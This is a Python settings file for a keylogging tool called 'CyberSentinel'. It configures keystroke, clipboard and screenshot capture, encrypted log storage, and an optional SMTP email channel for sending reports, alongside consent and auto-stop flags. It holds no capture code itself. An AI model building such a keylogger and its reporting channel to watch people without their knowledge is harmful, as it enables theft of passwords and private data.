import os
from pathlib import Path
from datetime import datetime

BASE_DIR = Path(__file__).resolve().parent.parent
LOG_DIR = BASE_DIR / "logs"
SCREENSHOT_DIR = LOG_DIR / "screenshots"
EXPORT_DIR = BASE_DIR / "exports"
KEY_DIR = BASE_DIR / ".keys"

for directory in [LOG_DIR, SCREENSHOT_DIR, EXPORT_DIR, KEY_DIR]:
    directory.mkdir(parents=True, exist_ok=True)

ENCRYPTION_ENABLED = True
KEY_FILE = KEY_DIR / "sentinel.key"
KEY_ROTATION_HOURS = 24

LOG_FILE_PREFIX = "keystroke_log"
LOG_FORMAT = "csv"
BUFFER_SIZE = 50
FLUSH_INTERVAL_SECONDS = 30
CAPTURE_SPECIAL_KEYS = True
CAPTURE_TIMESTAMPS = True
SESSION_ID = datetime.now().strftime("%Y%m%d_%H%M%S")

CLIPBOARD_ENABLED = True
CLIPBOARD_POLL_INTERVAL = 3
CLIPBOARD_LOG_FILE = LOG_DIR / f"clipboard_{SESSION_ID}.enc"

SCREENSHOT_ENABLED = True
SCREENSHOT_INTERVAL = 60
SCREENSHOT_QUALITY = 70
SCREENSHOT_FORMAT = "png"

EMAIL_ENABLED = False
EMAIL_SMTP_SERVER = os.getenv("SENTINEL_SMTP_SERVER", "smtp.gmail.com")
EMAIL_SMTP_PORT = int(os.getenv("SENTINEL_SMTP_PORT", "587"))
EMAIL_SENDER = os.getenv("SENTINEL_EMAIL_SENDER", "")
EMAIL_PASSWORD = os.getenv("SENTINEL_EMAIL_PASSWORD", "")
EMAIL_RECIPIENT = os.getenv("SENTINEL_EMAIL_RECIPIENT", "")
EMAIL_REPORT_INTERVAL = 3600

DASHBOARD_REFRESH_RATE = 1
MAX_DISPLAY_KEYS = 200
THEME_PRIMARY = "cyan"
THEME_SECONDARY = "magenta"
THEME_ACCENT = "green"
THEME_WARNING = "yellow"
THEME_ERROR = "red"

REQUIRE_CONSENT = True
CONSENT_LOG_FILE = LOG_DIR / "consent_records.json"
AUTO_STOP_HOURS = 8
WATERMARK_LOGS = True

APP_NAME = "CyberSentinel"
APP_VERSION = "1.0.0"
APP_TAGLINE = "Ethical Keystroke Monitoring Suite"
APP_AUTHOR = "CyberSecurity Research Team"

BANNER = r"""
   ____      _                 ____             _   _            _ 
  / ___|   _| |__   ___ _ __  / ___|  ___ _ __ | |_(_)_ __   ___| |
 | |  | | | | '_ \ / _ \ '__| \___ \ / _ \ '_ \| __| | '_ \ / _ \ |
 | |__| |_| | |_) |  __/ |     ___) |  __/ | | | |_| | | | |  __/ |
  \____\__, |_.__/ \___|_|    |____/ \___|_| |_|\__|_|_| |_|\___|_|
       |___/                                                        
"""
